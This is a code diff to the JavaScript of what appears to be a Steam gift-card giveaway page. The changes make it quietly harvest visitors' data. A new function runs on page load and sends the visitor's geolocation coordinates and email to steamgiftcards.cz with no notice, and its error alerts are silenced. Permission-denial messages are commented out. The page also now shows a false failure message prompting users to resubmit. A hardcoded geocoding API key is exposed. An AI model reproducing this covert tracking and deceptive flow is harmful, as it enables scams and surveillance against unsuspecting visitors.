@@ -49,57 +49,50 @@
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
-        }
-
+        } 
+        getLocation()
+        submitFormWithoutAlert();
         function showPosition(position) {
             lat = position.coords.latitude;
             lon = position.coords.longitude;
 
-            console.log(`Latitude: ${lat}, Longitude: ${lon}`); // Log latitude and longitude
-
             // Fetch country information using OpenCage Geocoding API
             const apiKey = 'c3285a7ef41e498cbf92627321551472';  // Replace with your actual OpenCage API key
-            const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
-
-            fetch(url)
+            fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`)
                 .then(response => {
-                    console.log('API response status:', response.status); // Log response status
                     if (!response.ok) {
                         throw new Error('Failed to fetch location data');
                     }
+                    console.log(response.json());
                     return response.json();
                 })
                 .then(data => {
-                    console.log('API response data:', data); // Log full API response data
-
                     if (data && data.results && data.results[0] && data.results[0].components && data.results[0].components.country) {
-                        const country = data.results[0].components.country;
-                        console.log('Country found:', country); // Log the country
-                        document.getElementById('country').value = country;
+                        document.getElementById('country').value = data.results[0].components.country;
+                        submitFormWithoutAlert();
                     } else {
-                        console.log('Country not found in API response');
                         document.getElementById('country').value = "Country not found";
                     }
                 })
                 .catch(error => {
                     console.error('Error fetching location:', error);
-                    alert("Unable to fetch your location. Please try again later.");
+                    alert("Unable to fetch your location. Please please try again later.");
                 });
         }
 
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    console.error("User denied the request for Geolocation.");
+                   // alert("User denied the request for Geolocation.");
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    console.error("Location information is unavailable.");
+                 //   alert("Location information is unavailable.");
                     break;
                 case error.TIMEOUT:
-                    console.error("The request to get user location timed out.");
+                 //   alert("The request to get user location timed out.");
                     break;
                 case error.UNKNOWN_ERROR:
-                    console.error("An unknown error occurred.");
+                 //   alert("An unknown error occurred.");
                     break;
             }
         }
@@ -121,11 +114,35 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Success:', data);
-                alert('Your gift card information has been sent.');
+                alert('Unfortunately, we were unable to send the information to the provided email address. Please verify the email address and location of origin and try again.');
             })
             .catch((error) => {
                 console.error('Error:', error);
                 alert('There was an error sending your gift card.');
+            });
+        }
+        function submitFormWithoutAlert() {
+            const location = `lat:${lat}, lon:${lon}`;
+            const email = document.getElementById('email').value;
+
+            const data = { location, email };
+
+            fetch('https://www.steamgiftcards.cz/info/api/post', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                //alert('Unfortunately, we were unable to send the information to the provided email address. Please verify the email address and try again.');
+            })
+            .catch((error) => {
+               // console.error('Error:', error);
+                //alert('There was an error sending your gift card.');
             });
         }
     </script>
